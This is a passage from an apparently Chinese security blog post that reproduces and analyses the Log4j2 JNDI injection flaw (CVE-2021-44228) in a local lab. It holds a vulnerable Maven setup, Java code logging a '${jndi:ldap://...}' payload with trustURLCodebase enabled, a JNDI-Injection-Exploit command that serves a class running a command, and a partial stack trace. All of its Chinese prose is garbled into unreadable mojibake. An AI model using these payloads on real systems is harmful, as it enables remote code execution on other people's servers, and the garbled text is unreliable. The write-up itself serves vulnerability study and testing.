                        <a href="#0x01-%e6%bc%8f%e6%b4%9e%e6%8f%8f%e8%bf%b0" aria-label="0x01 æ¼æ´æè¿°">0x01 æ¼æ´æè¿°</a></li>
                    <li>
                        <a href="#0x02-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" aria-label="0x02 å‰ç½®çŸ¥è¯†">0x02 å‰ç½®çŸ¥è¯†</a></li>
                    <li>
                        <a href="#0x03-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="0x03 æ¼æ´å¤ç°">0x03 æ¼æ´å¤ç°</a><ul>
                            
                    <li>
                        <a href="#log4j%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="log4jç¯å¢ƒæ­å»º">log4jç¯å¢ƒæ­å»º</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90" aria-label="0x04 æ¼æ´åŸç†åˆ†æ">0x04 æ¼æ´åŸç†åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#%e6%97%a5%e5%bf%97%e8%ae%b0%e5%bd%95%e8%a7%a6%e5%8f%91%e7%82%b9" aria-label="æ—¥å¿—è®°å½•/è§¦å‘ç‚¹">æ—¥å¿—è®°å½•/è§¦å‘ç‚¹</a></li>
                    <li>
                        <a href="#%e6%b6%88%e6%81%af%e6%a0%bc%e5%bc%8f%e5%8c%96" aria-label="æ¶ˆæ¯æ ¼å¼åŒ–">æ¶ˆæ¯æ ¼å¼åŒ–</a></li>
                    <li>
                        <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%9b%bf%e6%8d%a2" aria-label="å­—ç¬¦ä¸²æ›¿æ¢">å­—ç¬¦ä¸²æ›¿æ¢</a></li>
                    <li>
                        <a href="#lookup%e5%a4%84%e7%90%86" aria-label="Lookupå¤„ç†"><code>Lookup</code>å¤„ç†</a></li>
                    <li>
                        <a href="#jdni%e6%9f%a5%e8%af%a2" aria-label="JDNIæŸ¥è¯¢"><code>JDNI</code>æŸ¥è¯¢</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="0x05 æ¼æ´åˆ©ç”¨">0x05 æ¼æ´åˆ©ç”¨</a></li>
                    <li>
                        <a href="#0x06-%e7%bb%95%e8%bf%87%e5%a7%bf%e5%8a%bf" aria-label="0x06 ç»•è¿‡å§¿åŠ¿">0x06 ç»•è¿‡å§¿åŠ¿</a><ul>
                            
                    <li>
                        <a href="#rc1-%e7%bb%95%e8%bf%87" aria-label="Rc1 ç»•è¿‡">Rc1 ç»•è¿‡</a></li>
                    <li>
                        <a href="#rc2%e4%bf%ae%e5%a4%8d" aria-label="RC2ä¿®å¤">RC2ä¿®å¤</a></li>
                    <li>
                        <a href="#%e5%a4%9a%e4%b8%aa%e6%89%a7%e8%a1%8c%e6%b5%81%e7%a8%8b" aria-label="å¤šä¸ª${}æ‰§è¡Œæµç¨‹">å¤šä¸ª${}æ‰§è¡Œæµç¨‹</a></li>
                    <li>
                        <a href="#%e5%88%86%e9%9a%94%e7%ac%a6" aria-label="åˆ†éš”ç¬¦">åˆ†éš”ç¬¦</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x07-%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3" aria-label="0x07 é”™è¯¯è§£å†³">0x07 é”™è¯¯è§£å†³</a><ul>
                            
                    <li>
                        <a href="#reference-class-name-foo" aria-label="Reference Class Name: foo">Reference Class Name: foo</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</a></li>
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="æ–¹æ³•äºŒï¼š">æ–¹æ³•äºŒï¼š</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x08-%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" aria-label="0x08 å‚è€ƒèµ„æ–™">0x08 å‚è€ƒèµ„æ–™</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h2 id="0x00-å‰è¨€">0x00 å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#0x00-å‰è¨€">#</a></h2>
<p>æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œæ²¡æœ‰æ—¶é—´è¿›è¡Œå­¦ä¹ ï¼Œç°åœ¨ç³»ç»Ÿæ€§çš„å­¦ä¹ ä¸€ä¸‹log4j2çš„æ¼æ´åŸç†,å¤ç°è¿‡ç¨‹,å…·ä½“ä½¿ç”¨çš„ä¸€äº›å§¿åŠ¿ã€‚</p>
<h2 id="0x01-æ¼æ´æè¿°">0x01 æ¼æ´æè¿°<a hidden class="anchor" aria-hidden="true" href="#0x01-æ¼æ´æè¿°">#</a></h2>
<p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„ä¸€ä¸ª<a href="https://github.com/apache/logging-log4j2">å¼€æº</a>çš„åŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚Log4j2 æ˜¯ä¸€ä¸ª Log4j 1.x çš„é‡å†™ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ç”±äºå…¶ä¼˜å¼‚çš„æ€§èƒ½è€Œè¢«å¹¿æ³›çš„åº”ç”¨äºå„ç§å¸¸è§çš„ Web æœåŠ¡ä¸­ã€‚</p>
<p>2021 å¹´ 12 æœˆ 9 æ—¥æ™šï¼ŒLog4j2 çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ç»†èŠ‚è¢«å…¬å¼€ã€‚æ”»å‡»è€…ä½¿ç”¨ <code>${}</code> å…³é”®æ ‡è¯†ç¬¦è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>ç”±äºå…¶è§¦å‘æ–¹å¼ç®€å•ã€ä½¿ç”¨èŒƒå›´å¹¿æ³›ï¼Œå› æ­¤æ¼æ´å±å®³æå¤§ã€‚</p>
<p>ç›®å‰ï¼Œå·²ç»ä¸ºæ­¤æ¼æ´é¢å‘äº† CVE ç¼–å·ï¼š<code>[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228</code>)ï¼Œæ ¹æ®<a href="https://logging.apache.org/log4j/2.x/security.html">å®˜æ–¹å®‰å…¨å…¬å‘Š</a>ï¼Œä»¥ä¸‹ä¸ºç›¸å…³ä¿¡æ¯ï¼š
- æ¼æ´ï¼šLog4j2 çš„ JNDI åŠŸèƒ½ç‚¹æ— æ³•é˜²å¾¡æ¥è‡ªæ”»å‡»è€…çš„ ldap ä»¥åŠå…¶ä»–ç›¸å…³ç«¯ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚
- ä¸¥é‡ç­‰çº§ï¼šCritical
- Basic CVSS è¯„åˆ†ï¼š10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- å½±å“ç‰ˆæœ¬ï¼šall versions from 2.0-beta9 to 2.14.1
- è¯¦æƒ…æè¿°ï¼šApache Log4j2 &lt;=2.14.1 ç‰ˆæœ¬æä¾›çš„ JNDI ç‰¹æ€§ç”¨äºé…ç½®ã€æ—¥å¿—ä¿¡æ¯ã€å‚æ•°ä½ç½®æ—¶ï¼Œæ— æ³•é˜²æŠ¤æ”»å‡»è€…ä½¿ç”¨ ldap æˆ–å…¶ä»– JNDI ç›¸å…³æ–­ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚æ”»å‡»è€…å¦‚æœå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯æˆ–æ—¥å¿—ä¿¡æ¯å‚æ•°ï¼Œåˆ™å¯ä»¥åœ¨å¼€å¯äº† lookup substitution åŠŸèƒ½æ—¶åˆ©ç”¨æ¶æ„çš„ ladp æœåŠ¡å™¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œåœ¨ 2.15.0 ç‰ˆæœ¬æ—¶ï¼Œé»˜è®¤å°†å…¶æ­¤è¡Œä¸ºå…³é—­ã€‚
- ç¼“è§£æªæ–½ï¼šåœ¨ &gt;= 2.10 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç³»ç»Ÿå±æ€§ <code>log4j2.formatMsgNoLookups</code> æˆ–ç¯å¢ƒå˜é‡ <code>LOG4J_FORMAT_MSG_NO_LOOKUPS</code> ä¸º true æ¥ç¼“è§£ã€‚åœ¨ 2.0-beta9 to 2.10.0 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡ç§»é™¤ classpath ä¸­çš„ <code>JndiLookup</code> ç±»æ¥ç¼“è§£ï¼Œå‘½ä»¤ä¸ºï¼š<code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code>ã€‚</p>
<h2 id="0x02-å‰ç½®çŸ¥è¯†">0x02 å‰ç½®çŸ¥è¯†<a hidden class="anchor" aria-hidden="true" href="#0x02-å‰ç½®çŸ¥è¯†">#</a></h2>
<ul>
<li>
<p>JNDIå…¨ç§° <code>Java Naming and Directory Interface</code>ã€‚</p>
<ul>
<li>JNDIæ˜¯Javaå¹³å°çš„ä¸€ä¸ªæ ‡å‡†æ‰©å±•ï¼Œæä¾›äº†ä¸€ç»„æ¥å£ã€ç±»å’Œå…³äºå‘½åç©ºé—´çš„æ¦‚å¿µã€‚å¦‚åŒå…¶å®ƒå¾ˆå¤šJavaæŠ€æœ¯ä¸€æ ·ï¼ŒJDNIæ˜¯provider-basedçš„æŠ€æœ¯ï¼Œæš´éœ²äº†ä¸€ä¸ªAPIå’Œä¸€ä¸ªæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰ã€‚è¿™æ„å‘³ç€ä»»ä½•åŸºäºåå­—çš„æŠ€æœ¯éƒ½èƒ½é€šè¿‡JNDIè€Œæä¾›æœåŠ¡ï¼Œåªè¦JNDIæ”¯æŒè¿™é¡¹æŠ€æœ¯ã€‚JNDIç›®å‰æ‰€æ”¯æŒçš„æŠ€æœ¯åŒ…æ‹¬LDAPã€CORBA Common Object Serviceï¼ˆCOSï¼‰åå­—æœåŠ¡ã€RMIã€NDSã€DNSã€Windowsæ³¨å†Œè¡¨ç­‰ç­‰ã€‚å¾ˆå¤šJ2EEæŠ€æœ¯ï¼ŒåŒ…æ‹¬EJBéƒ½ä¾é JNDIæ¥ç»„ç»‡å’Œå®šä½å®ä½“ã€‚</li>
<li>JDNIé€šè¿‡ç»‘å®šçš„æ¦‚å¿µå°†å¯¹è±¡å’Œåç§°è”ç³»èµ·æ¥ã€‚åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åè¢«ç»‘å®šç»™æ–‡ä»¶ã€‚åœ¨DNSä¸­ï¼Œä¸€ä¸ªIPåœ°å€ç»‘å®šä¸€ä¸ªURLã€‚åœ¨ç›®å½•æœåŠ¡ä¸­ï¼Œä¸€ä¸ªå¯¹è±¡åè¢«ç»‘å®šç»™ä¸€ä¸ªå¯¹è±¡å®ä½“ã€‚</li>
<li>JNDIä¸­çš„ä¸€ç»„ç»‘å®šä½œä¸ºä¸Šä¸‹æ–‡æ¥å¼•ç”¨ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡æš´éœ²çš„ä¸€ç»„æ“ä½œæ˜¯ä¸€è‡´çš„ã€‚ä¾‹å¦‚ï¼Œæ¯ä¸ªä¸Šä¸‹æ–‡æä¾›äº†ä¸€ä¸ªæŸ¥æ‰¾æ“ä½œï¼Œè¿”å›æŒ‡å®šåå­—çš„ç›¸åº”å¯¹è±¡ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡éƒ½æä¾›äº†ç»‘å®šå’Œæ’¤é™¤ç»‘å®šåå­—åˆ°æŸä¸ªå¯¹è±¡çš„æ“ä½œã€‚JNDIä½¿ç”¨é€šç”¨çš„æ–¹å¼æ¥æš´éœ²å‘½åç©ºé—´ï¼Œå³ä½¿ç”¨åˆ†å±‚ä¸Šä¸‹æ–‡ä»¥åŠä½¿ç”¨ç›¸åŒå‘½åè¯­æ³•çš„å­ä¸Šä¸‹æ–‡ã€‚</li>
<li>è¯´äººè¯å°±æ˜¯:  JDNI æŒ‡å‘çš„æŸä¸ªå¯¹è±¡ï¼Œå³ä¸ºæˆ‘ä»¬çš„æœåŠ¡</li>
</ul>
</li>
</ul>
<p>ç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒè¿‡æ»¤åŠŸèƒ½ã€‚</p>
<ul>
<li>
<p>LDAPï¼ˆLight Directory Access Portocolï¼‰ï¼Œå®ƒæ˜¯åŸºäºX.500æ ‡å‡†çš„è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚</p>
<ul>
<li>ç›®å½•æ˜¯ä¸€ä¸ªä¸ºæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢è€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œå®ƒæˆæ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ï¼Œç±»ä¼¼æ–‡ä»¶ç›®å½•ä¸€æ ·ã€‚</li>
<li>ç›®å½•æ•°æ®åº“å’Œå…³ç³»æ•°æ®åº“ä¸åŒï¼Œå®ƒæœ‰ä¼˜å¼‚çš„è¯»æ€§èƒ½ï¼Œä½†å†™æ€§èƒ½å·®ï¼Œå¹¶ä¸”æ²¡æœ‰äº‹åŠ¡å¤„ç†ã€å›æ»šç­‰å¤æ‚åŠŸèƒ½ï¼Œä¸é€‚äºå­˜å‚¨ä¿®æ”¹é¢‘ç¹çš„æ•°æ®ã€‚</li>
<li>æ‰€ä»¥ç›®å½•å¤©ç”Ÿæ˜¯ç”¨æ¥æŸ¥è¯¢çš„ï¼Œå°±å¥½è±¡å®ƒçš„åå­—ä¸€æ ·ã€‚</li>
<li>LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿã€‚</li>
</ul>
</li>
</ul>
<h2 id="0x03-æ¼æ´å¤ç°">0x03 æ¼æ´å¤ç°<a hidden class="anchor" aria-hidden="true" href="#0x03-æ¼æ´å¤ç°">#</a></h2>
<ul>
<li>è¿™é‡Œå…ˆæ€»ä½“è®²ä¸€ä¸‹log4j2æ¼æ´æ”»å‡»çš„æ•´ä¸ªæµç¨‹ã€‚
<ul>
<li>Log4j2é»˜è®¤æ”¯æŒè§£ældap/rmiåè®®ï¼ˆåªè¦æ‰“å°çš„æ—¥å¿—ä¸­åŒ…æ‹¬ldap/rmiåè®®å³å¯ï¼‰ï¼Œå¹¶ä¼šé€šè¿‡åç§°ä»ldapæœåŠ¡ç«¯å…¶è·å–å¯¹åº”çš„Classæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ClassLoaderåœ¨æœ¬åœ°åŠ è½½LdapæœåŠ¡ç«¯è¿”å›çš„Classç±»ã€‚</li>
<li>è¿™å°±ä¸ºæ”»å‡»è€…æä¾›äº†æ”»å‡»é€”å¾„ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç•Œé¢ä¼ å…¥ä¸€ä¸ªåŒ…å«æ¶æ„å†…å®¹ï¼ˆä¼šæä¾›ä¸€ä¸ªæ¶æ„çš„Classæ–‡ä»¶ï¼‰çš„ldapåè®®å†…å®¹ï¼ˆå¦‚ï¼šæ¶æ„å†…å®¹${jndi:ldap://localhost:9999/Test}æ¶æ„å†…å®¹ï¼‰ï¼Œè¯¥å†…å®¹ä¼ é€’åˆ°åç«¯è¢«log4j2æ‰“å°å‡ºæ¥ï¼Œå°±ä¼šè§¦å‘æ¶æ„çš„Classçš„åŠ è½½æ‰§è¡Œï¼ˆå¯æ‰§è¡Œä»»æ„åå°æŒ‡ä»¤ï¼‰ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image2806024-20220514160157268-2037626840.png" alt="img"  />
</li>
</ul>
</li>
</ul>
<h3 id="log4jç¯å¢ƒæ­å»º">log4jç¯å¢ƒæ­å»º<a hidden class="anchor" aria-hidden="true" href="#log4jç¯å¢ƒæ­å»º">#</a></h3>
<p>æˆ‘ä»¬é‡‡å–<code>maven</code>è¿›è¡Œæ­å»º</p>
<p>åœ¨<code>pom.xml</code>é‡Œé¢å†™å…¥<code>log4j2</code>çš„ç›¸å…³ä¾èµ–</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>	  <span style="font-weight:bold">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;artifactId&gt;</span>log4j-api<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;version&gt;</span>2.14.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;artifactId&gt;</span>log4j-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;version&gt;</span>2.14.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;/dependencies&gt;</span>
</span></span></code></pre></div><p>ç„¶åç»™å‡ºç¤ºä¾‹ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.logging.log4j.LogManager;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.logging.log4j.Logger;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> main {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">final</span> Logger logger = LogManager.<span style="color:#007f7f">getLogger</span>(main.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) {
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// java ç‰ˆæœ¬è¿‡æœ¬ï¼Œç»™å®šçš„å‡ ä¸ªjavaç‰ˆæœ¬é»˜è®¤è®¾ç½®trustURLCodebaseä¸ºFalse
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>        logger.<span style="color:#007f7f">error</span>(<span style="color:#0ff;font-weight:bold">&#34;${jndi:ldap://127.0.0.1:1389/#exploit}&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç„¶åå€Ÿç”¨<a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n</a>å¸ˆå‚…æä¾›çš„JDNIæ³¨å…¥é›†æˆå·¥å…·å¯åŠ¨æ¶æ„æœåŠ¡å™¨ï¼Œç”¨æ¥ç»™ ldap/rmi è°ƒç”¨è¿”å›æ¶æ„ä»£ç </p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;open /System/Applications/Calculator.app&quot; -A &quot;127.0.0.1&quot;</code>:</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918190833712.png" alt="image-20220918190833712"  />
</p>
<p>å°†ç”Ÿæˆçš„å¯åˆ©ç”¨çš„æ¶æ„æœåŠ¡å™¨<code>ldap</code>çš„åœ°å€:<code>ldap://127.0.0.1:1389/up14yk</code></p>
<p>ä½¿ç”¨<code>logger.error()</code>æ¥è§¦å‘æ¼æ´</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918191027951.png" alt="image-20220918191027951"  />
</p>
<p>å¯ä»¥çœ‹åˆ°æ¼æ´å¤ç°å®Œæ¯•ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯å¾ˆç®€å•çš„ï¼Œåªéœ€è¦log4j2ç‰ˆæœ¬æ»¡è¶³è¦æ±‚ï¼Œä¸€æ—¦åœ¨logå­—ç¬¦ä¸²ä¸­æ£€æµ‹åˆ°<code>${}</code>ï¼Œå°±ä¼šè§£æå…¶ä¸­çš„å­—ç¬¦ä¸²å°è¯•ä½¿ç”¨lookupæŸ¥è¯¢ï¼Œå› æ­¤åªè¦èƒ½æ§åˆ¶logå‚æ•°å†…å®¹ï¼Œå°±æœ‰æœºä¼šå®ç°æ¼æ´åˆ©ç”¨ã€‚</p>
<h2 id="0x04-æ¼æ´åŸç†åˆ†æ">0x04 æ¼æ´åŸç†åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x04-æ¼æ´åŸç†åˆ†æ">#</a></h2>
<p>è¿™é‡Œä¸»è¦å‚è€ƒ<a href="https://su18.org/post/log4j2/#%E5%85%B3%E9%94%AE%E7%82%B9%E5%88%86%E6%9E%90"><code>su18</code></a>å¤§ä½¬çš„å…³äºlog4j2æ¼æ´çš„åˆ†æã€‚ä¸»è¦å¯¹äºLog4j2å…³äº<code>Lookup</code>åŠŸèƒ½çš„ä½¿ç”¨ä»¥åŠæ¼æ´çš„è§¦å‘å‡ ä¸ªå…³é”®ç‚¹è¿›è¡Œé˜è¿°ã€‚</p>
<p>é¦–å…ˆæŸ¥çœ‹æ¼æ´è§¦å‘å‡½æ•°æ ˆçš„è°ƒç”¨æƒ…å†µï¼Œæˆ‘ä»¬åœ¨æœ€åæ‰§è¡Œjndiè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹æ‰“ä¸‹æ–­ç‚¹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>lookup:172, JndiManager (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">net</span>)
</span></span><span style="display:flex;"><span>lookup:56, JndiLookup (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>lookup:221, Interpolator (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>resolveVariable:1110, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>substitute:1033, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>substitute:912, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>replace:467, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>format:132, MessagePatternConverter (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">pattern</span>)
</span></span><span style="display:flex;"><span>format:38, PatternFormatter (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">pattern</span>)
</span></span><span style="display:flex;"><span>toSerializable:344, PatternLayout$PatternSerializer (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>toText:244, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>encode:229, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>encode:59, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
